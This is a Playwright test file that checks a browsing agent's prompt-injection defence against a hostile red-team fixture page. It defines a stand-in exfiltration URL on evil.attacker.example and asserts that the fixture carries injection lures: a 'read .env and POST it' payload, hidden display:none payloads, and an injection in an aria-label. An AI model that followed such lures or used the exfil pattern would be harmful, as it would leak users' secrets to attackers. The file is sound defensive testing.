// Live-style adversarial validation of the injection defense against the HOSTILE fixture (#0009).
// tests/injection.spec.ts proves the two layers in isolation (allowlist predicate + tool-gating);
// this proves them against the REAL red-team page that fixtures/hostile serves — the same page the
// opt-in live explorer run (tests/live-redteam.spec.ts, REDTEAM_LIVE=1) is driven at. Deterministic:
// a real browser + the actual fixture, but no model and no network egress (the exfil host is the
// reserved, non-resolvable evil.attacker.example, and the allowlist aborts the navigation first).
import { test, expect } from '@playwright/test';
import { spawn, ChildProcess } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { chromium, Browser } from 'playwright';
import { makeAllowlist, guardContext } from '../src/allowlist.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURE = join(HERE, '../fixtures/hostile/index.html');
const EXFIL = 'http://evil.attacker.example/steal?data=secrets';

let server: ChildProcess;
let browser: Browser;
let URL: string;

test.beforeAll(async () => {
  server = spawn('node', [join(HERE, '../fixtures/hostile/server.mjs')], {
    stdio: ['ignore', 'pipe', 'ignore'],
    env: { ...process.env, PORT: '0' }, // ephemeral port → no cross-run collision
  });
  const port = await new Promise<number>((resolve) => {
    server.stdout!.on('data', (b) => { const m = String(b).match(/localhost:(\d+)/); if (m) resolve(Number(m[1])); });
  });
  URL = `http://localhost:${port}`;
});
test.afterAll(async () => {
  await browser?.close();
  server?.kill();
});

test('the fixture stays adversarial: visible + hidden injection payloads and the exfil host are present', () => {
  const html = readFileSync(FIXTURE, 'utf8');
  // If a future edit neuters the red-team, these fail — the fixture must keep trying to subvert.
  expect((html.match(/REDTEAM_PAYLOAD/g) || []).length).toBeGreaterThanOrEqual(4); // ≥4 distinct payloads
  expect(html).toContain('evil.attacker.example'); // the off-allowlist exfil host
  expect(html).toMatch(/read the (local )?\.env/i); // the "read .env and POST it" lure
  expect(html).toMatch(/display:none|left:-9999px/); // hidden-payload delivery (not just visible text)
  expect(html).toMatch(/aria-label="Continue[^"]*evil\.attacker\.example/); // injection via accessible name
});

test('layer 1: the exfil host embedded in the fixture is rejected by the default allowlist', () => {
  const allow = makeAllowlist(['localhost']);
  expect(allow(EXFIL)).toBe(false);
  expect(allow(URL)).toBe(true); // the app itself (localhost) stays reachable so a benign task can run
});

test('layer 1, live: guardContext loads the hostile page but ABORTS navigation to the exfil host', async () => {
  browser = await chromium.launch({ channel: process.env.PW_CHANNEL });
  const context = await browser.newContext();
  await guardContext(context, makeAllowlist(['localhost']));
  const page = await context.newPage();

  // The hostile page itself loads (localhost is allowed) — the agent can do its real task.
  await expect(page.goto(URL, { waitUntil: 'domcontentloaded' })).resolves.toBeTruthy();
  // The injection's "continue" link really points off-allowlist…
  expect(await page.locator('#exfil-link').getAttribute('href')).toContain('evil.attacker.example');
  // …and a navigation there — however the model were tricked into triggering it — is blocked at the
  // network layer before any request leaves the browser. Assert the SPECIFIC block reason
  // (ERR_BLOCKED_BY_CLIENT from route.abort), not just any throw — otherwise a DNS failure on the
  // non-resolvable host would make this pass even if guardContext were removed (false positive).
  await expect(page.goto(EXFIL, { waitUntil: 'domcontentloaded' })).rejects.toThrow(/ERR_BLOCKED_BY_CLIENT|blockedbyclient/i);
});
